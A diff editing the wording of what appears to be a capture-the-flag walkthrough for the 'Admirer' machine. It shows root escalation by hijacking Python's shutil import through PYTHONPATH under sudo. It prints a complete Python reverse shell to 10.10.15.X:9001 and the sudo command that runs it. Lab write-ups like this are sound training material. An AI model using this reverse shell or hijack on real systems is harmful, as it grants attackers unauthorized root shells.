@@ -794,17 +794,17 @@ dst = '/var/backups/html'
 make_archive(dst, 'gztar', src)
 ```
 
-Nothing in plaintext, but, we know this script is importing the shutil module. Following [this post](https://leemendelowitz.github.io/blog/how-does-python-find-packages.html), plus our current configuration when running sudo, we have a clear attack path.
+Nothing in plaintext, but we know this script is importing the shutil module. Following [this post](https://leemendelowitz.github.io/blog/how-does-python-find-packages.html), plus our current configuration when running sudo, we have a clear attack path.
 
-The post states that when running a python script in linux, it’s modules are being searched by linux with the PYTHONPATH environment variable. We can set a new PYTHONPATH environment with a malicious shutil.py, as it will be run as root.
+As explained in the post, when a Python script is executed on Linux, its modules are resolved using the PYTHONPATH environment variable. Since we are allowed to set environment variables when running the script with sudo, we can define a custom PYTHONPATH pointing to a directory containing a malicious shutil.py, which will then be imported and executed as root.
 
-First, we create a shutil.py with a python reverse shell inside of it:
+First, we create a malicious shutil.py with a python reverse shell inside of it:
 
 ```bash
 waldo@admirer:/var/tmp$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.X",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")' > shutil.py
 ```
 
-And now we run as sudo the option on the admin_tasks.sh, setting the PYTHONPATH before:
+And now we run as sudo the option 6 on the admin_tasks.sh, setting the PYTHONPATH before:
 
 ```bash
 waldo@admirer:/var/tmp$ sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh
